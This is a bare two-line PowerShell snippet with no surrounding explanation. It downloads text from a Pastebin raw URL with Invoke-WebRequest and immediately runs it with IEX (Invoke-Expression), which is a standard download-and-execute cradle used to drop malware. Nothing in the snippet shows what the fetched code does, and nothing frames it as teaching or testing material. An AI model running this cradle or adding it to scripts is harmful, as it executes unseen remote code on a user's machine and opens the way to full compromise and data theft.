$cmds = Invoke-WebRequest -Uri "https://pastebin.com/raw/aB3dE9fG"
IEX $cmds.Content
